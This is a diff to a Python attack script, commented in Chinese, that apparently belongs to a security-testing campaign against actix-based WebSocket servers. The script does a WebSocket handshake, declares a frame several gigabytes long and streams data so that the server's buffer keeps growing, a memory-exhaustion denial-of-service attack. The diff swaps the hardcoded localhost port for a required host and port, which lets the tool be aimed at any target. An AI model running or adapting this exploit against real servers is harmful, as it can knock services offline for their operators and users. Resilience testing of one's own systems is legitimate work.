@@ -1,10 +1,15 @@
 #!/usr/bin/env python3
-"""R5-4: actix ws 未完成帧累积攻击 — 声明大帧长 + 持续流式喂数据, 观察 buf 累积"""
+"""R5-4: ws 未完成帧累积攻击 — 声明大帧长 + 持续流式喂数据, 观察 buf 累积
+
+用法: python3 ws_frame_accum.py <host> <port> [declared_len] [stream_mb]
+  declared_len 缺省 4<<30 (4GB), stream_mb 缺省 200; host/port 必传,
+  目标端口不得内置于模板 (v3.5 去项目化: 历史战役曾硬编码固定端口)。
+"""
 import socket, struct, sys, time
 
-def handshake(sock):
+def handshake(sock, host, port):
     key = "dGhlIHNhbXBsZSBub25jZQ=="
-    req = (f"GET /ws HTTP/1.1\r\nHost: 127.0.0.1:18084\r\n"
+    req = (f"GET /ws HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
     sock.sendall(req.encode())
@@ -19,10 +24,13 @@ def frame_header(declared_len):
     return bytes(hdr)
 
 def main():
-    declared = int(sys.argv[1]) if len(sys.argv) > 1 else 4 << 30    # 4GB
-    stream_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 200       # 流式发送量
-    s = socket.create_connection(("127.0.0.1", 18084), timeout=5)
-    handshake(s)
+    if len(sys.argv) < 3:
+        sys.exit("usage: ws_frame_accum.py <host> <port> [declared_len] [stream_mb]")
+    host, port = sys.argv[1], int(sys.argv[2])
+    declared = int(sys.argv[3]) if len(sys.argv) > 3 else 4 << 30    # 4GB
+    stream_mb = int(sys.argv[4]) if len(sys.argv) > 4 else 200       # 流式发送量
+    s = socket.create_connection((host, port), timeout=5)
+    handshake(s, host, port)
     time.sleep(0.5)
     s.sendall(frame_header(declared))
     print(f"[+] declared {declared/2**30:.0f}GB frame, streaming {stream_mb}MB payload data...")
